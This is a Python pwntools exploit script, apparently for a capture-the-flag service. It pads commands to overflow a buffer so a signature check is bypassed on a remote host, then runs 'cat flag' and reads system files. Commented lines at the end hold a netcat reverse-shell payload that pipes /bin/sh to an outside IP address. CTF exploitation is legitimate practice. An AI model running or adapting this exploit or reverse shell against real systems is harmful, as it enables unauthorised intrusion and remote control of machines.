#!/usr/bin/python

from pwn import *
local = False

def get_conn():
	if local:
		return process("./sss")
	else:
		return remote("54.202.7.144", 9875)


def get_sig(cmd):

	my_conn = get_conn()
	my_conn.recvuntil(">_")
	my_conn.sendline("1")
	my_conn.recvuntil("what command do you want to sign?")
	my_conn.sendline(cmd)
	r = my_conn.recvuntil("sig")
	if "not" in r:
		print "It won't sign " + cmd
		return "NOPE"
	my_conn.recvuntil("\n")
	sig = my_conn.recvuntil("\n")
	my_conn.close()
	return sig


def execute_cmd(cmd, sig):

	my_conn = get_conn()
	my_conn.recvuntil(">_")
	my_conn.sendline("2")
	my_conn.recvuntil("what command do you want to run?")
	my_conn.sendline(cmd)
	my_conn.recvuntil("gimme signature:")
	my_conn.sendline(sig)
	c = "1) sign command"
	resp = my_conn.recvuntil(c)[:-len(c)] # get rid of the menu bit
	my_conn.close()
	return resp

# iterate to get differnet hash values
# fill the buffer with 'A's so that when it null terminates
# it actually sets use_md5 to 0
# which will happen after we get the extra byte override pointer
for x in range(100):



	cmd = "cat flag; cat /proc/sys/vm/mmap_min_addr ;cat flag; echo " + str(x)
	cmd += "D"*(256 - len(cmd))
	print cmd
	print len(cmd)
	sig = "asdf" # just something
	if sig == "NOPE":
		continue
	try:
		r = execute_cmd(cmd, sig)
		if "me" not in r:
			print r
			exit(1)
	except:
		pass



# cmd = rev.format(num=x) + " " + "#"*(256 - len(rev + str(x) + " ") + 5)
# rev = """cat flag;echo '{num}' ; nc 13.54.31.23 1234  | /bin/sh -i | nc 13.54.31.23 1235 ;"""
#cat flag;echo '94' | nc 13.54.31.23 1234 ; #####################################################################################################################################################################################################################

